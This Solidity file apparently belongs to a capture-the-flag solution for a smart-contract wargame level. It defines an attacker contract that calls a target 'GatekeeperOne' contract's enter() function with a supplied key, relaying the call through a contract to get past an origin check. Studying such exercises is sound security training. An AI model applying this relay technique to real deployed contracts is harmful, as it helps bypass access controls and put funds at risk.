// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {GatekeeperOne} from "../GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function attackGatekeeperOne(
        GatekeeperOne gatekeeperOne,
        bytes8 key
    ) external onlyOwner returns (bool) {
        return gatekeeperOne.enter(key);
    }
}
